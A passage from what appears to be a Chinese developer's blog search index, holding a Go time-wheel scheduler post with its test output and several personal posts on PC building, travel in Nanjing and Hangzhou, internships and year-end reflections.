getPosAndCircleByInterval(d time.Duration) (int, int) &#123;\tdelayMs := int(d.Milliseconds())\tintervalMs := int(tw.interval.Milliseconds())\tticks := delayMs / intervalMs\tcircle := ticks / tw.slotNums\tpos := (tw.currentPos + ticks) % tw.slotNums\t// 特殊case，当计算的位置和当前位置重叠时，因为当前位置已经走过了，所以circle需要减一\tif pos == tw.currentPos &amp;&amp; circle != 0 &#123;\t\tcircle--\t&#125;\treturn pos, circle&#125;// 该函数用任务的创建时间来计算下次执行的位置和圈数func (tw *TimeWheel) getPosAndCircleByCreatedTime(createdTime time.Time, d time.Duration) (int, int) &#123;\tdelayMs := int(d.Milliseconds())\tintervalMs := int(tw.interval.Milliseconds())\tticksPassed := int(time.Since(createdTime).Milliseconds()) / intervalMs\ttotalTicks := delayMs / intervalMs\tremainingTicks := totalTicks - ticksPassed\tif remainingTicks &lt;= 0 &#123;\t\tremainingTicks = 1 // 防止立即过期\t&#125;\tcircle := remainingTicks / tw.slotNums\tpos := (tw.currentPos + remainingTicks) % tw.slotNums\t// 特殊case，当计算的位置和当前位置重叠时，因为当前位置已经走过了，所以circle需要减一\tif pos == tw.currentPos &amp;&amp; circle != 0 &#123;\t\tcircle--\t&#125;\treturn pos, circle&#125;\n\n测试：\npackage testimport (\t&quot;catventure-idle-server/internal/common/timewheel&quot;\t&quot;github.com/sirupsen/logrus&quot;\t&quot;testing&quot;\t&quot;time&quot;)func TestTimeWheel(t *testing.T) &#123;\tvar err error\ttw := timewheel.NewTimeWheel(time.Second, 60)\ttw.Start()\terr = tw.AddTask(&amp;timewheel.Task&#123;\t\tKey:      &quot;test1&quot;,\t\tInterval: time.Second * 5,\t\tTimes:    -1,\t\tJob: func(task *timewheel.Task) &#123;\t\t\tlogrus.Infof(&quot;task %s run at %s\\n&quot;, task.Key, time.Now().Format(&quot;2006-01-02 15:04:05&quot;))\t\t&#125;,\t&#125;)\tif err != nil &#123;\t\tlogrus.Errorf(&quot;add task failed: %v&quot;, err)\t&#125;\terr = tw.AddTask(&amp;timewheel.Task&#123;\t\tKey:      &quot;test2&quot;,\t\tInterval: time.Second * 1,\t\tTimes:    10,\t\tJob: func(task *timewheel.Task) &#123;\t\t\tlogrus.Infof(&quot;task %s run at %s\\n&quot;, task.Key, time.Now().Format(&quot;2006-01-02 15:04:05&quot;))\t\t&#125;,\t&#125;)\tif err != nil &#123;\t\tlogrus.Errorf(&quot;add task failed: %v&quot;, err)\t&#125;\t\ttime.Sleep(time.Second * 30) // 休眠30s，查看运行结果&#125;\n\n运行结果：\n=== RUN   TestTimeWheeltime=&quot;2025-07-24T22:24:57+08:00&quot; level=info msg=&quot;task test2 run at 2025-07-24 22:24:57\\n&quot;time=&quot;2025-07-24T22:24:58+08:00&quot; level=info msg=&quot;task test2 run at 2025-07-24 22:24:58\\n&quot;time=&quot;2025-07-24T22:24:59+08:00&quot; level=info msg=&quot;task test2 run at 2025-07-24 22:24:59\\n&quot;time=&quot;2025-07-24T22:25:00+08:00&quot; level=info msg=&quot;task test2 run at 2025-07-24 22:25:00\\n&quot;time=&quot;2025-07-24T22:25:00+08:00&quot; level=info msg=&quot;task test1 run at 2025-07-24 22:25:00\\n&quot;time=&quot;2025-07-24T22:25:01+08:00&quot; level=info msg=&quot;task test2 run at 2025-07-24 22:25:01\\n&quot;time=&quot;2025-07-24T22:25:02+08:00&quot; level=info msg=&quot;task test2 run at 2025-07-24 22:25:02\\n&quot;time=&quot;2025-07-24T22:25:03+08:00&quot; level=info msg=&quot;task test2 run at 2025-07-24 22:25:03\\n&quot;time=&quot;2025-07-24T22:25:04+08:00&quot; level=info msg=&quot;task test2 run at 2025-07-24 22:25:04\\n&quot;time=&quot;2025-07-24T22:25:05+08:00&quot; level=info msg=&quot;task test2 run at 2025-07-24 22:25:05\\n&quot;time=&quot;2025-07-24T22:25:05+08:00&quot; level=info msg=&quot;task test1 run at 2025-07-24 22:25:05\\n&quot;time=&quot;2025-07-24T22:25:10+08:00&quot; level=info msg=&quot;task test1 run at 2025-07-24 22:25:10\\n&quot;time=&quot;2025-07-24T22:25:15+08:00&quot; level=info msg=&quot;task test1 run at 2025-07-24 22:25:15\\n&quot;time=&quot;2025-07-24T22:25:20+08:00&quot; level=info msg=&quot;task test1 run at 2025-07-24 22:25:20\\n&quot;--- PASS: TestTimeWheel (30.00s)PASS","categories":["编程记录"],"tags":["go","定时任务","算法","时间轮"]},{"title":"2024年年终总结","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/2024%E5%B9%B4%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/","content":"2024年过的平平淡淡，让我回忆一下，然后下面就是流水账时间…\n上半年上半年都在实习公司度过，因为去年年底项目才上线，年初也比较忙，没有什么记录，基本就是上班。不过因为忙，人手不够，所以也让我开始写Java了，不再是低代码平台和写写sql了。（不过，写CURD接口和写sql区别也不是特别大）\n三月份配了台新电脑，花了四千三。内存也是上到了64G，不过很少跑满，跑一半的情况都比较少。不过基本不用担心内存不够的问题了，minecraft几百个mod的大型整合包我也能边开服务器边开客户端玩。可惜的就是板U，买了Q1HY，工程测试的版本。便宜是真便宜，就是不稳定，频率高了会蓝屏。现在也基本默频在用，没有超频了。\n到五月份，重要的事情就是毕设答辩了。毕业设计这个东西的代码我从去年8月左右在实训的时候就开始写了。那时候很闲，处于慢慢写的状态，基本完成的差不多了。也庆幸那时候就开始了，不然按实习那个工作强度，再加上毕设的代码和论文。会过得非常痛苦。论文基本上第一遍就过了，后面按导师的意见改改格式，大体上的内容基本没有改动。然后就是五月回学校答辩，答辩其实很水，感觉还是ppt和讲为主。最后展示系统的时候，三个老师看一个教师大概三十人，分开看。其实基本也就扫一眼，十秒左右。总的来说，除了拿学位证之外，没有任何意义。（当然，也可以自己赋予意义。可惜的是，我赋予的意义最终也像大部分项目一样烂尾了。因为最初这个项目是为了给墨夏使用的。\n五月另一个重要的事就是拍毕业照了。和不太熟悉的同班同学聊聊近况，和熟悉的朋友聊聊未来打算。有人考上研，后面继续求学；有人考研失败，继续备考；有人和我一样找工作，问我怎么面试的；还有找到实习和我一样当牛马的。大家都有各自的人生轨迹，也有计划，但无一例外地我觉得大家都很迷茫，只是短暂地享受着最后一个月的大学生活。和室友不是一个专业，单独拍了一些照片（下面放个我在中间的宿舍合照吧）。\n\n最后说下舍友的情况吧，除了我他们都没有干计算机相关的工作。左一，家境不错，回昆山找了个工作。steam全是游戏，三年前只狼就七周末乱杀…是个富哥。左二，河南的小伙，在考公。第一次考就进了面，但面试被刷了，现在也依然在考公。很有梗，是个非常有趣的人。右一，健身快三年了，合照可以看出来练得非常好。现在继续健身，并且在做电商主播（直播、模特、卖货应该）。把爱好当饭吃，很有个性的人。还有一个不在的富哥，大二去澳大利亚留学了。另外两个朋友也大概说下吧，他们在我隔壁宿舍，和我舍友是一个专业，转专业后和我是一个专业。非常巧的是，我们三个宿舍连在一起。\n\n左一，考研失败了。在学校附近找了份实习，同时继续备考。是周教授的关门大弟子，实验室唯一的本科生，三年来都没新生加入。搞人工智能高手。右二，富哥，申请了美国的大学，现在也在美国待了很久了。是个心态上很摆的人，但事情做得很好。高考复读了一次，作文偏题吧。很牛逼的人。左二，我们计算机院的章院长，现在被调到生物院了好像。\n六月底，到毕业的时候了。又回了趟学校。回去就两件事\n\n拿毕业证和学位证\n和朋友们告别\n\n所有的一切都像走流程一样，没有太大的伤感氛围。和舍友最后聚了一次，后面估计很难再在一起了。（不过他们三个前几天倒是聚了一次\n下半年七月一号，我签了劳动合同，继续在这家公司干。还是牛马的生活。不过项目暂时没那么忙了，就是年底会非常地忙。（大概是总部的业绩要求没有达到吧\n七月底搬了次家，搬到现在住的地方。离公司更近了，但离地铁站更远了，为此买了辆山地车。（很烂的车，后悔了搬家是因为原来租的房子涨价了，当初租房也十分地草率。去年的年终里有提今年新租的房子是和同事整租的，他和他老婆原来住在她姐家，六楼的步梯房。因为他老婆怀孕不方便所以换房子。那周末找了个中介和他跑了一下午，看了好几间。有一间是很有矛盾的，很合适的房子，但是才装修一年，他老婆觉得有甲醛所以否决掉了。当时已经要放弃了，同时满足我们俩要求的房子实在是太少了。让中介找了最后一间，也就是这间基本满足了。搬家是真累，我真要吐槽六楼的步梯房。（他俩东西还多\n后面就正常上班，一直到十二月之前都不怎么忙。这段时间看了两本书，《收获，不止Oracle》和《Redis设计与实现》。还有两本本原来是在计划里的。一本是《收获，不止SQL优化》，看了大纲，和开发相关性不大，和DBA的相关性很大，所以就不准备读了。另一本是《Apache Kafka实战》，因为太忙了，暂时也搁置了。这本后面有空还是会读的，在计划中。期间也看了点《Haskell函数式编程入门（第2版）第1卷》，前面的概念太复杂了，而且语法也非常地抽象。可以说和现有的几乎所有编程语言都不一样。最终也是只搭了环境，草草地跟着书写了一点就结束了。\n后面打算自己写个项目，准备用p2p，整了很久也没整出来。研究 BitTorrent协议 和 内网穿透 研究了很久。后面应该会继续做吧最后就是前几天，给鱼排的聊天室节点用go实现了一个版本。经过站长阿达的高强度测试，最终也是上了北京的节点暂时运行一周看看情况。最开始五十多个客户端，阿达疯狂输管理员命令（管理员命令会广播两次，命令本身和系统回复）。会出现卡顿和明显地吞消息情况。再到后来为每个消息都用协程发送，虽然改善了吞消息，但是并发一大就会崩。最后改成为每个ws连接创建协程，终于是稳定了，250左右的连接测试时也非常流畅。（让阿达测上限，说上限是他的硬盘，250个连接电脑已经很卡了）测试过程中，阿达一直说原本的实现就不会这样随便造。真是太欠了。那是netty牛逼，我要是能纯手搓出netty这样的，我做梦都能笑醒。（阿达骂人表情包.jpg）还给我提了个限制流量的需求，真是难搞啊。\nEnd是非常想换工作的一年，也是面试全部失败的一年，也是我第一次不想写java的一年。想转go，不知前路如何。自己还是和前两年一样迷茫。\n","categories":["记录生活"],"tags":["记录生活"]},{"title":"Ventoy！多系统启动u盘","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/Ventoy%EF%BC%81%E5%A4%9A%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8u%E7%9B%98/","content":"推荐推荐一个可以制作多系统启动u盘的工具—— Ventoy可以将u盘制作为可以安装多个系统的启动盘，同时可以正常当成u盘存储数据。\n安装方式非常简单，装系统也非常简单！文档甚至开源 github\n故事由于最近在冲动之下买了主板和CPU，不得已开始组装新电脑，需要装系统。(现在各个配件还在路上)加之，以前的 usb2.0 u盘已经坏了，工作的时候总是和用户借u盘，真是太尴尬了。所以在新的u盘到了之后便寻找并安装了 Ventoy，当天就往里塞了三个系统镜像。\n有趣的事情来了。第二天在徐州的用户那时，他们专门配了个新电脑用来跑我部署的程序。电脑很新！包装盒就在边上。但是打开系统的那一刻，我顿感不妙。如图：\n碰到国产系统了，大概率会有不兼容的事要发生。结果和我猜的也差不多。不兼容！因为用户的内网环境，需要VPN等软件登进内网。但是他们的软件没有麒麟系统的版本\n于是乎，在一顿等待之后。用户让我们装Windows系统。真是太巧合了，昨天刚到的u盘，为了新买的还在路上的电脑装下载的系统镜像。在今天就用上了。像是给我装机前的预习一样。\nF7 从u盘启动，安装 windows，之后重启，delete 进入bios，修改启动引导，完事。\n经典念诗环节\n然后就是赶高铁回家了。下班！\n","categories":["记录生活"],"tags":["系统","攒机"]},{"title":"是新电脑！","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E6%98%AF%E6%96%B0%E7%94%B5%E8%84%91%EF%BC%81/","content":"起因现在的笔记本已经快用了四年了。CPU还是 i5-10210U，内存还是加过一根8G内存条的，一共16G。现在已经完全不够用了。编译启动项目十分的慢，并且时常爆内存。甚至键盘按键都有几个不灵了，是不是按不出来或者按一下蹦两个。悲\n原本打算今年毕业的时候组装一台台式机，CPU线程要多，频率能高就高，其次就是内存要大。（我是真被idea干出内存焦虑了）并且想开多系统，当服务器 7*24 不关机的。用的时候直接远程。显卡是无所谓的，能打LOL的水平就够我用了。虽然也很想要2k60流畅3A的水平。如果我才大一，我一定会搞个好点的显卡，但现在我上班了，电子阳痿了属于是，LOL都不打了。工作害人\n看过很多方案，常见的 i5-12600KF，13600KF，itx到atx。还有垃圾佬的 e3，e5，x79，x99平台。再到 AMD 的 epyc。一颗u上万，还能双路，明显不是我能消费的。虽然内存上1T看得很爽，谁能拒绝单根64G大容量，主板插满呢\n最后偶然在图吧评论看到 h系列 es 的 cpu。高性能低功耗，还便宜，谁让是es的u呢。然后就蹲最近的 Q1HY，虽然没赶上最便宜的时候，但终究是没按耐住。毕竟es的u应该也不多，买一片少一片吧。虽然现在黄鱼加价卖的也不少，但等热度过去，估计也难买。毕竟es的u，虽然可以看作没质保，但总比黄鱼好点。\n过两天等到货就可以装新电脑了，真是不错。\n配置单\n\n\n配件\n名称\n价格\n\n\n\n板U\n尔英Q1HY matx\n1299\n\n\n内存\n银爵 D5 6000 32*2 海力士M-die-C36\n1248(1199)\n\n\n固态\n致钛TiPlus7100 2TB\n979(974.19)\n\n\n电源\n鑫谷GM650W冰山版 金牌模组\n379(363.93)\n\n\n散热\n利民PA120 MINI\n169(164)\n\n\n无线网卡\nIntel AX210\n94(88)\n\n\n机箱\n御猫K2mini\n179(173)\n\n\n总计\n\n4347(4261.12)\n\n\n组装配件陆陆续续到了之后，就开始组装了。有一说一，matx的机箱装起来还是有点小的，手伸不进去，螺丝难拧。还好买的不是itx，不然装机可就太痛苦了。因为过程中电源和网卡换了，拆装了不下五次。下次再装机我肯定格外熟练\n电源本来是航嘉的WD650K直出，也是没看就买了，那么大个直出。机箱本来就小，还那么多用不上的线，更不好装。索性就退了重新买了个全模组的。买回来之后好像也就这样。退货还花了20运费。算是对我粗心的惩罚吧。\n网卡也是，买成了Pcie*1的接口的网卡。买之前还是得看下接口。\n没理线，还是乱。matx没地方给我理线、机箱说实话，也选的一般。特别是它那玻璃侧板，拆下来温度就明显低下来了，不拆就是闷罐。有个原因可能是，没装风扇。\n为什么呢？原本觉得太热，买了六个风扇，25mm*9cm的，结果太厚了，装不进那个我塞不进手的缝隙。得买15mm的。一看太贵了，多上几个都赶上我六热管的利民散热器了。再加上，我把玻璃侧板拆了，温度低了很多。干脆就都不要了。不管是风扇还是玻璃侧板。也许后面会考虑下亚克力的侧板吧，不过现在就这样吧。\n超频谁能想到仅1300的板u还能超频呢？于是进bios一顿调参。全核5.2G，我是真敢超。然后时常蓝屏重启。这样不行，对于我不想关机的人来说有点接受不了。虽然低负载，但还是蓝屏。\n全核5.0G。还行，能用。但当我开始玩死亡搁浅的时候，有点寄。半个小时温度上来后，就又蓝屏了。那天晚上游戏崩了有四五次。包括游戏本身崩了一次，其他大概率都是超频的问题。\n不行，恢复了bios的全部设置。超频的尽头是默认。这下不蓝屏了，不过频率低了，性能也就低了。毕设后端代码原来超频时，编译只需要6s，现在默认需要10s。不过也满足了，比我的笔记本强太多了。而且主要也便宜。\nEnd最后，吐槽下显卡的价格。是真的贵啊。4060ti得三千多，4060也得两千大几。也只有等毕业真正上班才能考虑下了，实习的工资考虑不了一点。\n最后，放张图吧。乱七八糟的线，能用就行吧。不追求那么多了。\n哦，还有块老电脑上拆下来的465G的2.5寸固态硬盘。不得不说，64G真爽，没有内存不够的问题了，基本想开多少软件就开多少。\n","categories":["记录生活"],"tags":["攒机"]},{"title":"南京总统府","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E5%8D%97%E4%BA%AC%E6%80%BB%E7%BB%9F%E5%BA%9C/","content":"前言无意间发现小米云空间满了，点进去一看，原来是自动备份给塞满了。然后发现了以前出去玩的照片，或许不是自动备份的话，它们也许就消失了。所以我想，博客或许也是另一种备份的方式。\n这些照片是 2022-01-21 拍的本来打算上午去鸡鸣寺，下午去总统府的（通了地铁，直通南京是真的爽）。但是早上到南京之后，鸡鸣寺那天并没有开门（没记错的话，应该是疫情管控。可恶的疫情啊）\n另外，中午吃的那家鸭血粉丝是真的不好吃（这个倒是记得蛮清楚的）。\n照片图片顺序就无所谓了。能找到就不错了\n\n最后陪我去的憨憨的背影单独放\n","categories":["记录生活"],"tags":["游","南京","多图"]},{"title":"杭州九溪至云栖竹径徒步线","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E6%9D%AD%E5%B7%9E%E4%B9%9D%E6%BA%AA%E8%87%B3%E4%BA%91%E6%A0%96%E7%AB%B9%E5%BE%84%E5%BE%92%E6%AD%A5%E7%BA%BF/","content":"这一篇不止是徒步线的记录，还记录了国庆假期左右的其他，其实分两三篇应该会更好。\n国庆前首先国庆和中秋连在一起放了八天假期。公司在节前发了蟹卡（五公五母十只螃蟹）和两个柚子。螃蟹带回家了没有尝到，柚子倒是很不错。\n\n家国庆假期的前几天在家，久违的过年的感觉。只是比过年的人少了很多，没有那么的热闹，但也足够了。和朋友去吃了火锅，六个人吃了不到四百，人均才六十多，不到七十。相比我之前和现在工作的地方真的是便宜太多了。那家火锅店也是很偏僻了，在县城的边边上，旁边就是农田了，对面就是护城河。\n\n朋友还跑了两三家药店帮我买药，我跑了几家也没得卖。最后买到了四小瓶。后来朋友妈妈知道了还打电话来和我说，因为朋友舅舅得过这个病，所以她比较了解，给我推荐了别的药。真的非常感谢了。\n去姨妈家吃饭，在门口盆里的鸡胗和肠子还被猫叼跑了。痛失两道菜。一共四只猫，还为了这些吃的打架。对峙吵架中…\n\n吃完后就躺在树下的花坛边睡觉，过得真舒服啊。\n徒步假期后半程回到杭州，准备和朋友去徒步。计划路线是：九溪公交站 - 九溪烟树 - 九溪十八涧 - 龙井村 - 十里锒铛 - 云栖竹径但是实际上并没有走这条线。\n我俩在九溪公交站会合，这里可以看到钱塘江：\n\n到了之后，就开始向里进发。应该是沿着小溪一路向上，不多久就可以到九溪烟树。\n\n再往后，一路上都能碰到各种小溪。喜欢玩水的人会非常开心了，大热天玩水也是很舒服。\n\n然后就是龙井村，这里的每家每户好像都卖茶叶。这里商业化不是非常严重，每家都是独栋建筑，有些巷子可以看到别人家的院子，有些在路边会有弄得很好看的花园。\n\n在龙井村这里，我们偏离了原定路线。准备接着向北走，去法喜寺尝下素斋。此时已经下午快一点，除了路上带的几瓶水，两块面包和几块巧克力，我们没吃别的。（饿啊但后面是上山的路，也是最难走的。\n\n接着爬到山顶，有个三叉还是四岔路，往法喜寺的方向是下山的方向。一路上都是树荫遮蔽，比上山的茶田一路上晒过来要好了很多。出了树林，有一段很长很长的下坡，坡度很大。没有阶梯，纯坡。看着护林员骑着电动车走大S线骑上来…\n下山后，到法喜寺。进门每人给了三柱香。（朋友说他是党员，所以我有了六柱寺门口有很多人在摸字。寺里的锦鲤很多很好看。\n\n在法喜寺休息了很久，有大麦茶和菊花茶。可惜的是因为在修缮的原因，没有吃到素斋。\n不过出了寺庙之后，去吃了一家素食自主，是今天的第一顿饭了。此时已经四点了大概（有点难崩，不过吃了三碗\n\n最后迎着夕阳去往公交站，准备坐公交去云栖竹径（他说是不能忘记最开始的目标\n\n公交等了很久很久，324H线！等车的时候，遇到了一家印度人（应该是印度人，非常经典的印度形象）。应该是老父亲，他的英语和中文说的都不错，和他儿子交流是他们自己的语言。大概聊了一些。\n等坐上公交，到达云栖竹径时，已经七点了，天已经黑了。然后云栖竹径关门了！很遗憾，只能回家了。\n遗憾也是常态，不按计划、随心而动的旅途才是放松身心的旅游。相遇是缘，不遇也是。没有赶进度的计划，没有被时间追着跑。能在公交站等一个小时的公交，和遇到印度人聊聊天也不错，不是吗。\n","categories":["记录生活"],"tags":["旅游","西湖","法喜寺"]},{"title":"烟雨西湖","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E7%83%9F%E9%9B%A8%E8%A5%BF%E6%B9%96/","content":"来杭州一个月了，总算是去了次西湖。五月中到杭州来，碰到朋友换工作六月中来杭州。算是他乡遇故知了，缘分。于是在一个周日的雨天，一起去西湖。（为什么是雨天呢，我也不知道。可能雨中的西湖更有意境吧\n在江城站会合，先去吃了片川儿垫垫肚子。然后准备去鼓楼。\n这是望仙阁上拍的，可以看到吴山上的寺庙和鼓楼堂（基督教堂）。\n\n后面是鼓楼，进去是南宋书房，有很多文创和冰箱贴。\n\n再往里就是河坊街，正常景区的商业街。很多小吃，还有中药店（叶种德堂）。\n\n朱炳仁铜雕艺术博物馆，全是铜雕的工艺品。\n\n杭州博物馆，杭州出土的文物，历史等。杭州现在有大大小小两百多家博物馆。\n\n博物馆逛了很久，出来后两三点左右，去吃了蟹黄面。第一口很鲜，非常不错。\n\n再然后就是西湖了。断桥残雪、苏堤。雨天人还是挺多，不过雨天的意境肯定也不一样。\n\n烟雨朦胧的感觉最后，全都淋湿了。不过也很久没有这么淋过雨了，还是挺舒服的。\n20公里！\n","categories":["记录生活"],"tags":["旅游","西湖"]},{"title":"2023，悲","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/2023%EF%BC%8C%E6%82%B2/","content":"这次就不写标题了，反正也没想到有什么可以区分的。很多时候也大概是这样，本该就是混乱和无序的。\n先说一些高兴的事情吧，毕竟一年的时间，全是标题里的悲的话，那倒也不至于。至于为什么是悲，主要取决于我最近的状态。写完开心的事，再写这些吧。\n三四月的时候还在学校上课，那段时间在准备找实习，虽然后面所有的面试都寄了。也没有耐心学的下去新的东西，指微服务那块自己用，完全用不到的。只是帮朋友写点接口，还遇到三四个人想一晚上sql的问题，当时还写篇博客记录，现在回去看到那个最后完成的sql都有些想笑。大概往回看就是这样，可能这就是成长？（某些方面，比如sql？想笑的原因也不止是sql，还有那些接口。为了图方便，所有的逻辑都是直接写在controller里的。（这个现在看来也还好，至于原因，实习的时候，老开发（他们都叫他大师）也这么干，图省事，他甚至直接在那拼接sql，最然不会有sql注入的问题。另外就是用 magic-api 搭了个低代码的平台方便主程自己实现一些简单的接口，因为主程是c#开发，用 unity 的。\n三月份的时候，因为蓝易云的活动，写了篇博客。关于如何搭建 minecraft 服务器的。最后也如愿以偿得到了一年的香港云服务器，但我腾讯云的还没到期，所以到现在也是一直闲置。真是浪费啊我还想毕业了新电脑直接整服务器，cpu 是 epyc 电表倒转的那种。现在想想也是我真的有那个需求吗，2c2g的服务器都能闲置（4c4g倒是高强度使用）。大概想法就是 linux windows 同时跑，可以随时远程开发。这个等弄新电脑了再说。\n然后五月份左右，有三个月都没写博客。那段时间，好像在投简历面试什么的。学校的双选会，就那么几家，全部都挂了。到现在我都很不理解，可能表达能力不太行吧还阳了一次，在疫情的第三年。发烧发了一晚上，很难受了属于是。不过新冠也是真的猛，毒性减弱了那么多，还打了疫苗，还是整的我三十八九度。\n后面没记错的话，因为双选会全寄，只能去学校安排的实训。我这个专业合作的企业是中软国际，著名的外包大厂。然后，我就有时间写博客了。因为那里讲的东西都过于基础了（至少对我来说，spring，git之类的）。然后也没啥人听他讲，毕竟看得出来，他也不想讲，上班而已。上午讲讲，下午就不讲了，让自己动手试。所以考研的看课做题，找工作的刷面试题，然后就是打游戏看电影的。我也看了铃芽户缔，是真的很喜欢新海诚的电影了。之前还补看了他初期的作品，云之彼端。秒速五厘米也是看了两遍。（没人陪我看，自己看也挺好后面在找实习的时候，又开始从头看家庭教师杀手。看了七十多集，后来找到实习就没空看了。害作业什么的，也比较简单。我写后端，有个同班的写前端，我们班去实训的七八个人，也就我和他还有有点技术力了。其他人甚至连git都不会用，也就不指望能写代码了。作业很无奈是小组作业，3-4人那种，第一次我俩随便带了个写报告和ppt的。第二次他们知道后，就基本都找过来要一组，但代码基本就两个人写，害。最后一次作业，我和前端都已经出去实习了。所以就干脆就我俩，没带任何人。答辩的时候，老师甚至都没怎么看，而是问了我俩近况。他是去了上海，我记得他是想去杭州来着。他去实习就能直接接触代码，进行开发。属实是给我羡慕到了，我去实习前一个月是低代码平台，流程图那种。后面终于去了正经的大项目，不过作为边缘人，我只能写sql，碰不到一点代码。虽然他也跟我吐槽过，他那边的后端实习生。\n想起来，去实训之前还借了朋友的 switch，准备打完王国之泪的。结果玩了一周就再也没碰过了，虽然不可否认这是个优秀的游戏，但和单人的 minecraft 一样，让我感觉到孤独。可能更喜欢玩 GTA5 这种，像看一部电影，读一本书，不过更加有参与感。虽然支线都没怎么做，只打了主线。线上太卡，环境也有点差\n在悲之前，还有件乐的事。其实应该放在前面的。就是羽毛球。从买羽毛球拍，到跟在打印店兼职认识的朋友在学校体育馆打。最后怡佳姐带我们出去打，真的是非常快乐的一段时间了。后面四个人一起还去爬了苏州灵岩山，此处有图，我去找找。\n\n开心的事情，果然是有照片的。还有打印店新员工——汤姆\n\n说回羽毛球，和我一起实训的那个前端。是院羽毛球队的！强是真的强，实训几个月，基本每周都要去打一次。俩人骑个共享电动车，骑到汽车站旁边的羽毛球馆，20块钱不限时，一打打一下午。他甚至还和别人打熟了，偶尔碰到还会切磋。在我看来，属于是神仙打架了。我实在打不动了，让我给他发球，他练反手。绝了有次去的路上，我记得有问过他以后想干什么。他说他想开个羽毛球馆，每天打打羽毛球。平淡且朴实无华让我想起了和怡佳姐他们去的那个羽毛球馆，常熟市运动会羽毛球冠军开的。是个精瘦的大爷没见过他扣杀，但他控球是真的强。丁阳还去挑战了一番，不出意料地被打爆了。\n乐的事情基本就这些了。\n\n划条分割线，下面就是悲的事情了。\n悲的事情大背景大概就是人们期盼的疫情后的经济复苏并没有到来，美国还在加息周期，看上去好像快加到头了？反正与我国降息刺激经济相悖。加之出生率一直在下降，人口已经负增长了。但这几年的应届毕业生都破千万了，工作也是真难找，大学生失业率估计也很高，不然也不会那么多去考研考公的。\n九月底找到了实习，来到了南京。然后第一次租房，就花了十来分钟。属于是太草率了，不过也就那样，后面大概知道租房要注意哪些地方了实习的公司是挺大一公司，但转正也只能外包。本部的正式员工得硕士或者985和211然后工资也不高，加班极其严重。就我实习这三个多月，知道的离职的和有离职想法的正式员工都五六个了，实习生更不用说，我见到的已经走了三个了，还有俩现在值班，两班倒轮班，能坚持不走属实牛，毕竟实习也就两三千块钱。\n我现在属于两个项目的人（大部分人也是身兼数职，同时在两三个项目辗转，哪里缺人去哪里）。最开始接触的那个低代码的，另一个实习生走后，就剩我和项目经理俩人做。他经常出差，和客户沟通，估计也是身兼数职。就我一个人做开发，一个小需求三万。公司是会赚钱的项目经理挺好，我说另外一个项目忙不过来（七十多个报表，还有俩别的需求），去不了他那。他反正非让我去，这边项目的领导也没说啥然后就去了，干完走的时候我才意识到，我不去没人了。难怪非要喊我去，绝包括项目经理也跟我吐槽，说这几个月离职的人多，他要和领导要人来帮忙。\n然后说说另外那个大项目，由总公司产品线的开发人员驻场开发，大概十来人。然后我们分公司协助，等开发完，后面全是分公司来维护。然后，这项目给我的感觉就是，前期没有一点规划，边调研边做。客户今天提的需求，明天就可能改，还不止改一次。然后每天不是在解决问题，就是在敷衍客户。但驻场开发，客户就在边上，没有一点办法。领导是会敷衍的，至少我学不来一点客户那边的领导是真的能骂，不光骂我们这边，骂和我们对接的另外的乙方，还骂他们自己公司的别的部门。是真的猛，还是技术专家（职位吧，还是头衔。不太清楚每天都加班，基本都十点半才下班。我最晚的一次是凌晨三点，真不知道图啥那些主管有时候还通宵，割接和上线的时候。不过偶尔也会聚餐，买点夜宵。不过也就那样，虽然没有很浓的应酬的感觉，但感觉也没那么好。库库吃就完了我的饭搭子同事甚至还建了干饭人的群，每到饭点，摇人吃饭。另外就是羡慕甲方朝九晚五，食堂便宜好吃（虽然不让我们吃），还有篮球场、羽毛球馆。甚至还有人过生日会给我们分几块蛋糕。\n实习的同时，偶尔也写点毕设的代码。但是最近项目上线是一点写的时间都没有了。（悲\n最后就是，虽然每天都在写sql，但多少还是能学到点东西，虽然不是我想学的（指后端开发相关现在干的属于是数据开发干的事。IQ数据库是列式数据库，适合于批量数据处理和即时查询。然后被我干崩了两次，当然也不只是我。主管那几天隔三岔五在群里问这个sql谁写的，来认领下。我干崩的原因是报表查询没加默认条件，有人导出18亿数据导致cpu满载，数据库不可用。18亿啊，真是人才别人干崩的原因差不多都是sql没走索引，大数据量导致的全表扫描。客户那边那个技术专家没少因为这骂过人，大概是当初设计的不合理，别人才过的坑，我们还在踩之类的。不过都与我无关了，写sql罢了，不知道什么时候能写点我想写的代码。（sql要写吐了，现在写sql应该很熟练了。不会有之前那种join都忘了的事情发生了\n不知不觉已经三点钟了，不知道是不是加班搞的我作息都不太正常了。去年的总结也是半夜写的，记得是快一点的时候完成的。最后的最后，我真的需要继续这份实习吗？是入行的机会？还是悲剧的开始？\n","categories":["记录生活"],"tags":["记录生活"]},{"title":"结束了，答辩","url":"/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E8%AE%B0%E5%BD%95%E7%94%9F%E6%B4%BB/%E7%BB%93%E6%9D%9F%E4%BA%86%EF%BC%8C%E7%AD%94%E8%BE%A9/","content":"答辩5月9号下午坐高铁回学校，不知不觉从去年九月底实习到现在已经上了半年多的班了。大四这一年，加上这次，也就去两次学校。可能在去年七月份去南通如皋实训的时候，我的大学生活就已经结束了吧。\n10号去拍毕业照，见到了已经调到东湖其他学院的章院长，拍了几张照片。还有和朋友们一起拍的照片，包括最后12号晚上，和舍友一起拍的，应该也是最后在一起聚了。\n晚上简单做了做答辩用的ppt，想着老师也不会特别为难。当然也不一定，我们的野兽王子就比较惨了。\n11号早上八点，开始答辩了。我是我们组第二个，有点难顶。不过也就那样，毕